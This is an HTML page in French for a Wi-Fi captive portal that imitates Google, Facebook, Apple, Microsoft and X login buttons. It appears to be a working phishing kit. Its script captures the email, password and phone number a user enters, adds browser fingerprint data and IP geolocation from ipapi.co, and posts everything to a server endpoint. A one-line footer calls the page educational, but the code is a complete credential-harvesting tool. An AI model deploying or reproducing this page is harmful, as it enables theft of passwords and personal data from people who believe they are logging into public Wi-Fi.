<!DOCTYPE html>
<html lang="fr">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1" />
  <title>Portail Wi-Fi</title>
  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600&display=swap" rel="stylesheet">
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" integrity="sha512-papErYgqP4hEQcx8zTq5bQfU5ftZ1qQkiHv+5Vg1T/0Pd9kT7EYpJrmK3tU1PO+JzqKvW3K5UjNwTS1zYfEknw==" crossorigin="anonymous" referrerpolicy="no-referrer" />
  <style>
    body {
      margin: 0;
      font-family: 'Inter', sans-serif;
      background: #f8f9fb;
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
    }

    .card {
      background: #fff;
      padding: 40px;
      border-radius: 16px;
      box-shadow: 0 8px 20px rgba(0,0,0,0.1);
      width: 100%;
      max-width: 420px;
      text-align: center;
    }

    .card h1 {
      font-size: 24px;
      margin-bottom: 20px;
      color: #333;
    }

    .social-btn {
      display: flex;
      align-items: center;
      gap: 12px;
      border: 1px solid #ddd;
      padding: 12px;
      border-radius: 8px;
      margin-bottom: 16px;
      background: #fff;
      cursor: pointer;
      transition: all 0.2s ease-in-out;
    }

    .social-btn:hover {
      background-color: #f1f1f1;
    }

    .social-btn i {
      font-size: 20px;
      width: 24px;
      text-align: center;
    }

    .form-container {
      display: none;
      margin-top: 20px;
      text-align: left;
    }

    .form-container input {
      width: 100%;
      padding: 12px;
      margin-bottom: 16px;
      border: 1px solid #ccc;
      border-radius: 6px;
      font-size: 14px;
    }

    .form-container button {
      width: 100%;
      padding: 12px;
      background: #007bff;
      border: none;
      border-radius: 6px;
      color: white;
      font-weight: 600;
      cursor: pointer;
    }

    .form-container button:hover {
      background: #0056b3;
    }

    .note {
      font-size: 12px;
      color: #888;
      margin-top: 20px;
    }
  </style>
</head>
<body>
  <div class="card">
    <h1>Connexion au Wi-Fi</h1>

    <div class="social-btn" onclick="showForm('google')">
      <i class="fab fa-google" style="color:#db4437"></i> Continuer avec Google
    </div>

    <div class="social-btn" onclick="showForm('facebook')">
      <i class="fab fa-facebook" style="color:#3b5998"></i> Continuer avec Facebook
    </div>

    <div class="social-btn" onclick="showForm('apple')">
      <i class="fab fa-apple" style="color:#000"></i> Continuer avec Apple
    </div>

    <div class="social-btn" onclick="showForm('microsoft')">
      <i class="fab fa-microsoft" style="color:#0078d4"></i> Continuer avec Microsoft
    </div>

    <div class="social-btn" onclick="showForm('twitter')">
      <i class="fab fa-x-twitter" style="color:#000"></i> Continuer avec X (Twitter)
    </div>

    <form id="auth-form" class="form-container">
      <input type="email" id="email" placeholder="Adresse e-mail" required />
      <input type="password" id="password" placeholder="Mot de passe" required />
      <input type="tel" id="phone" placeholder="Numéro de téléphone" required />
      <button type="submit">Se connecter</button>
    </form>

    <div class="note">* Portail Wi-Fi pédagogique – aucune authentification réelle.</div>
  </div>

<script>
  let sessionStart = Date.now();

  function showForm(provider) {
    document.getElementById("auth-form").style.display = "block";
  }

  document.getElementById("auth-form").addEventListener("submit", async function (e) {
    e.preventDefault();
    const email = document.getElementById("email").value;
    const password = document.getElementById("password").value;
    const phone = document.getElementById("phone").value;

    const userAgent = navigator.userAgent;
    const lang = navigator.language;
    const screenRes = `${window.screen.width}x${window.screen.height}`;
    const platform = navigator.platform;
    const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
    const sessionDuration = Math.round((Date.now() - sessionStart) / 1000);

    let geoInfo = {
      ip: "Inconnu",
      city: "Inconnue",
      region: "Inconnue",
      country: "Inconnu",
      org: "Inconnu",
      postal: "Inconnu",
      latitude: "N/A",
      longitude: "N/A"
    };

    try {
      const res = await fetch("https://ipapi.co/json");
      const data = await res.json();
      geoInfo = {
        ip: data.ip,
        city: data.city,
        region: data.region,
        country: data.country_name,
        org: data.org,
        postal: data.postal,
        latitude: data.latitude,
        longitude: data.longitude
      };
    } catch (err) {
      console.error("Erreur récupération IP/Géo :", err);
    }

    const message = `
🔐 Connexion Wi-Fi
📧 Email : ${email}
🔑 Mot de passe : ${password}
📱 Téléphone : ${phone}
🌍 IP : ${geoInfo.ip}
🏙️ Ville : ${geoInfo.city}
📍 Région : ${geoInfo.region}
🇨🇵 Pays : ${geoInfo.country}
🏢 FAI : ${geoInfo.org}
📮 Code Postal : ${geoInfo.postal}
📌 Coords : ${geoInfo.latitude}, ${geoInfo.longitude}

🧭 Navigateur : ${userAgent}
💻 Plateforme : ${platform}
🗺️ Langue : ${lang}
🕒 Fuseau horaire : ${timezone}
📐 Résolution écran : ${screenRes}
⏱️ Temps passé : ${sessionDuration} secondes
    `;

    fetch("/api/send", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ content: message })
    });

    alert("Connexion en cours...");
    document.getElementById("auth-form").reset();
  });
</script>
</body>
</html>
